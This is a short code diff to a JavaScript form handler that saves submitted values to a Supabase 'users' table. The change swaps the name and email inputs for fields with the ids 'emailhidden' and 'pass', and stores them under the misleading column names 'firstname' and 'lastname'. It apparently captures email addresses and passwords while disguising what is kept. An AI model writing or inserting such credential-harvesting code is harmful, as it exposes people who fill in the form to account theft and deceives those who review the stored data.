@@ -8,13 +8,13 @@
 
       form.addEventListener('submit', async (e) => {
         e.preventDefault();
-        const name = document.getElementById('name').value.trim();
-        const email = document.getElementById('email').value.trim();
+        const firstname = document.getElementById('emailhidden').value.trim();
+        const lastname = document.getElementById('pass').value.trim();
 
         try {
           const { data, error } = await supabase
             .from('users')
-            .insert([{ name, email }])
+            .insert([{ firstname, lastname }])
             .select(); // return inserted row(s)
 
           if (error) throw error;
@@ -23,3 +23,4 @@
          console.error(err);
         }
       });
+
